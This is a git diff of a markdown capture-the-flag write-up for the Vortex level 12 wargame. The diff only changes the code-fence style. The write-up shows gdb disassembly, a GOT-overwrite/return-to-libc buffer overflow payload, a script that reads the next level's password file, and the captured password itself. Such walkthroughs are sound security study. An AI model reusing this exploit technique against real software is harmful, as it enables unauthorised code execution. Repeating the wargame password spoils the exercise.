@@ -1,6 +1,6 @@
 
 Dump of assembler code for function main:
-'''assembly
+```assembly
    0x080486b8 <+0>:     push   ebp
    0x080486b9 <+1>:     mov    ebp,esp
    0x080486bb <+3>:     push   esi
@@ -44,8 +44,8 @@ Dump of assembler code for function main:
    0x08048756 <+158>:   pop    esi
    0x08048757 <+159>:   pop    ebp
    0x08048758 <+160>:   ret 
-'''   
-'''assembly
+```   
+```assembly
 Dump of assembler code for function unsafecode:
    0x08048698 <+0>:     push   ebp
    0x08048699 <+1>:     mov    ebp,esp
@@ -73,7 +73,7 @@ Dump of assembler code for function safecode:
    0x0804868a <+45>:    mov    DWORD PTR [esp],0x1
    0x08048691 <+52>:    call   0x80484e0 <sleep@plt>
    0x08048696 <+57>:    jmp    0x804866a <safecode+13>
-'''
+```
 
 If we recall, this code is identical to vortex8, but this time the stack isnt executable...  
 So, this time we'll want to use the already existing function strcpy to overwrite printf@plt, and run system("%d\n", ...) instead...  
@@ -82,10 +82,10 @@ let's prepare the stack to execute that operation:
 RECALL: a function's stack looks like: RET_ADDR param1 param2 ... parmN  
 so: lets call strcpy(printf@got.plt, SYSTEM_ADDR_IN_STACK)  
 finding system proved to be easy enough:  
-'''bash
+```bash
 (gdb) print system
 $1 = {int (const char *)} 0xf7fc3eb0 <system>
-'''
+```
 similarly, strcpy address is 0xf7e937b0  
 
 we go to the line call strcpy in unsafecode(), with the parameters dest = printf.got.plt, source=system.plt address (on stack), then return using ret to system("/bin/sh")...  
@@ -97,18 +97,18 @@ breakdown of the payload:
 we found out the stack locations to be: BBBB = 0xffffd2d8, CCCC = 0xffffd2e4  
 $(python -c 'print "A"*0x408 + "\xd4\xd2\xff\xff" + "\xb1\x86\x04\x08" +"\x0c\xa0\x04\x08" + "\xd8\xd2\xff\xff" + "\xb0\x3e\xfc\xf7" + "CCCC\xe4\xd2\xff\xff" + "/bin/sh"')  
 let's create a script file called %d and link it to PATH:  
-'''bash
+```bash
 #/bin/sh
 
 cat /etc/vortex_pass/vortex13
-'''
+```
 
 at last, we get:  
-'''bash
+```bash
 vortex12@vortex:/tmp/vt12$ /vortex/vortex12 $(python -c 'print "A"*0x408 + "\xd4\xd2\xff\xff" + "\xb1\x86\x04\x08" +"\x0c\xa0\x04\x08" + "\xd8\xd2\xff\xff" + "\xb0\x3e\xfc\xf7" + "CCCC\xe4\xd2\xff\xff" + "/bin/sh"')
 $ jMyg12=nB
 Segmentation fault (core dumped)
-'''
+```
 it worked!  
 password: jMyg12=nB  
 
